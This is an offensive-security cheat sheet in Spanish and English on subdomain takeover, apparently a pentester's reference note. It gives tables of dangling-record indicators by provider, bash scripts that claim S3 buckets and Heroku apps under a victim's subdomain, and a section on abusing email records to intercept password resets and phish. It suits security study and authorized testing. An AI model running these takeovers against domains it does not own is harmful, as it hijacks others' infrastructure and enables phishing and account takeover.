---
aliases:
  - S3 Takeover
  - GitHub Pages Takeover
  - Heroku Takeover
  - Azure Takeover
  - CloudFront Takeover
tags:
  - type/cheatsheet
  - vuln/subdomain-takeover
  - technique/initial-access
  - asset/cloud
  - asset/dns
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Subdomain Takeover]]'
---
# Subdomain Takeover - Tipos por Servicio

***

## Cloud Storage (S3 / Azure Blob / GCS)

| **Service** | **Indicator** | **Workflow** |
|:---:|:---:|:---:|
| AWS S3 | CNAME a `<bucket>.s3.amazonaws.com` con `NoSuchBucket` o 404 | Atacante crea bucket con mismo nombre. |
| AWS S3 (region-specific) | `<bucket>.s3-website-<region>.amazonaws.com` | Same — region matters. |
| AWS S3 takeover steps | 1. Identify dangling CNAME 2. Create bucket con same name en AWS account 3. Enable static website hosting 4. Upload index.html | Standard. |
| Azure Blob Storage | CNAME a `<account>.blob.core.windows.net` con error | Create storage account. |
| Azure Blob takeover | 1. Create Azure storage account con dangling name 2. Enable public access | Standard. |
| Google Cloud Storage | CNAME a `<bucket>.storage.googleapis.com` con NoSuchBucket | GCP. |
| GCS takeover | Create bucket en GCP con same name | Same flow. |
| AWS S3 backed websites | Often static sites con this pattern | Common. |
| Azure CDN endpoint | `<endpoint>.azureedge.net` | Edge case. |
| Linode Object Storage | `<bucket>.linode.com` | Less common. |
| Backblaze B2 | `<bucket>.s3.backblazeb2.com` | Same family. |
| Wasabi | `<bucket>.wasabisys.com` | Cheap S3 alt. |
| DigitalOcean Spaces | `<bucket>.digitaloceanspaces.com` | Alt. |
| MinIO self-hosted | Self-hosted equivalent | Edge. |
^sdt-types-storage

### S3 takeover end-to-end

```bash
# 1. Identify CNAME with NoSuchBucket
SUB="vulnerable.target.com"
CNAME=$(dig +short CNAME "$SUB")
# CNAME: target-bucket.s3.amazonaws.com

curl -s "https://$SUB" | grep -q "NoSuchBucket" && \
  echo "[+] $SUB CNAME a S3 bucket no existente"

# 2. Extract bucket name
BUCKET=$(echo "$CNAME" | cut -d. -f1)
echo "[*] Bucket name a claim: $BUCKET"

# 3. Create bucket en AWS account propio
aws s3api create-bucket --bucket "$BUCKET" --region us-east-1

# 4. Enable static website hosting
aws s3 website "s3://$BUCKET/" --index-document index.html

# 5. Upload PoC content
echo "<h1>Subdomain Takeover - PoC by atacante</h1>" > index.html
aws s3 cp index.html "s3://$BUCKET/" --acl public-read

# 6. Verify
curl -s "https://$SUB"
# Should return atacante's content
```

___

## PaaS (Heroku / Netlify / Vercel / Fastly)

| **Service** | **CNAME pattern** | **Indicator** |
|:---:|:---:|:---:|
| Heroku | `*.herokuapp.com` | "There's nothing here, yet" |
| Heroku takeover | Create Heroku app con same name + custom domain | Standard. |
| Netlify | `*.netlify.app` | "Page Not Found" Netlify-style |
| Netlify takeover | Deploy site + add custom domain | Free tier OK. |
| Vercel | `*.vercel.app` | 404 Vercel-style |
| Vercel takeover | Same — deploy + add custom domain | Free tier. |
| Fastly | `*.fastly.net` | Specific Fastly error |
| Fastly takeover | Create Fastly service + add domain | Paid tier required. |
| Render.com | `*.onrender.com` | Specific 404 |
| Render takeover | Deploy app, claim domain | Free tier. |
| Pantheon | `*.pantheonsite.io` | 404 |
| Pantheon takeover | Sign up, claim domain | Account required. |
| Surge.sh | `*.surge.sh` | "project not found" |
| Surge takeover | `surge` CLI deploy con domain | Trivial. |
| Cargo Collective | `*.cargocollective.com` | Specific |
| Webflow | `*.webflowcms.com`, `*.webflow.io` | Webflow 404 |
| Webflow takeover | Sign up + connect domain | Paid tier. |
| Bitbucket Pages | `*.bitbucket.io` | "Repository not found" |
| Bitbucket takeover | Create repo con same name | Free. |
| Helpscout / Helpjuice | Specific patterns | Per-service. |
| Worksites | `*.worksites.net` | Specific 404 |
^sdt-types-paas

### Heroku takeover

```bash
# 1. Identify Heroku dangling
SUB="docs.target.com"
curl -s "https://$SUB" | grep -q "no-such-app.herokuapp.com" && \
  echo "[+] Heroku takeover candidate"

# 2. Extract app name from CNAME
CNAME=$(dig +short CNAME "$SUB")
APP=$(echo "$CNAME" | cut -d. -f1)
echo "[*] App name: $APP"

# 3. Create Heroku app con same name
heroku create "$APP"

# 4. Add custom domain
heroku domains:add "$SUB"

# 5. Deploy PoC
git init
echo "<h1>Takeover</h1>" > index.html
git add . && git commit -m "PoC"
git push heroku main

# 6. Verify
curl -s "https://$SUB"
```

___

## SaaS (GitHub Pages / Tumblr / Shopify / Zendesk)

| **Service** | **CNAME pattern** | **Workflow takeover** |
|:---:|:---:|:---:|
| GitHub Pages | `*.github.io` | Create repo username.github.io o `repo`.github.io con CNAME file. |
| GitHub Pages multi-step | 1. Create repo 2. Add CNAME file con target subdomain 3. Enable Pages | Standard. |
| Tumblr | `*.tumblr.com` | Create blog + claim custom domain. |
| Shopify | `*.myshopify.com` | Sign up + add custom domain. |
| Squarespace | Connected domain | Sign up + connect dangling domain. |
| Zendesk | `*.zendesk.com` | Sign up Zendesk + claim host alias. |
| Wordpress.com | `*.wordpress.com` | Sign up + custom domain. |
| Tilda | `*.tilda.ws` | Sign up + custom domain. |
| Strikingly | `*.strikingly.com` | Sign up + custom domain. |
| Webflow CMS | `*.webflow.com` | Sign up + custom domain. |
| Aha! | `*.aha.io` | Per-product. |
| Helpjuice | Custom | Per-account. |
| Smartling | `*.smartling.com` | Localization platform. |
| ReadMe.io | `*.readme.io` | Docs platform. |
| Statuspage | `*.statuspage.io` | Status pages. |
| Acquia | Specific | Drupal hosting. |
| ContentBox | Custom | Less common. |
| Heroku again | (for SaaS-style apps) | Same. |
| Combine con product-specific docs | Vendor docs incluyen takeover steps | OSINT. |
^sdt-types-saas

___

## CDN Dangling (CloudFront / Cloudflare)

| **Service** | **CNAME pattern** | **Notas** |
|:---:|:---:|:---:|
| AWS CloudFront | `*.cloudfront.net` | Distribution deleted → dangling. |
| CloudFront takeover | Create distribution con custom domain matching dangling | Direct. |
| CloudFront alternate domain | If subdomain in distribution's "Alternate Domain Names" → atacante claims | Standard. |
| Cloudflare | Direct A records pointing a Cloudflare IPs | Less common, but if account abandoned. |
| Cloudflare workers | `*.workers.dev` | Per-worker takeover. |
| Cloudflare Pages | `*.pages.dev` | Custom domain takeover. |
| Akamai | `*.akamaihd.net` etc | Edge case enterprise. |
| Fastly Compute@Edge | Custom domain config | Edge. |
| KeyCDN | `*.kxcdn.com` | Smaller CDN. |
| MaxCDN/StackPath | Pre-acquisition | Legacy. |
| Hostinger CDN | Custom | Less common. |
| Edgecast / Verizon Media | Enterprise | Edge. |
^sdt-types-cdn

### CloudFront takeover specifics

```
1. Identify CNAME a *.cloudfront.net con specific 403 error
2. Create new CloudFront distribution
3. Add target subdomain en Alternate Domain Names (CNAMEs)
4. Configure SSL cert (ACM)
5. Set up origin (S3 bucket / custom domain)
6. Verify domain takeover
```

CloudFront requiere validar ownership con CNAME — atacante NO debería poder reclaim sin tener el subdomain. Pero si dangling es una distribution **deleted**, puede crear nueva con same Alt Domain.

___

## Email / Domain Providers

| **Service** | **Pattern** | **Notas** |
|:---:|:---:|:---:|
| MX dangling | MX record points a dead service | Email spoofing. |
| Office 365 / Exchange Online | `*.mail.protection.outlook.com` | If tenant deleted. |
| Google Workspace | `aspmx.l.google.com` | Less common takeover. |
| Mailchimp | `*.mailchimp.com` | Marketing email service. |
| Mailgun | Custom domains | If account abandoned. |
| SendGrid | Custom domain auth | If config abandoned. |
| Postmark | Custom sender domain | Same. |
| MX record con dead third-party | Email scope abuse | Edge. |
| Email sender SPF abuse | If SPF includes dead provider, atacante registers with provider | Spoof source. |
| DKIM dangling | DKIM TXT record points a dead | Spoofing. |
| Domain WHOIS expired | Full domain takeover | Major impact. |
^sdt-types-email

### Email-related takeover impact

```
- Receive emails sent to subdomain → password resets, reset tokens, internal comms.
- Send emails appearing from subdomain → phishing legítimo.
- Bypass SPF / DKIM checks since atacante owns subdomain.
- Combine con password reset flows → full ATO.
```

***
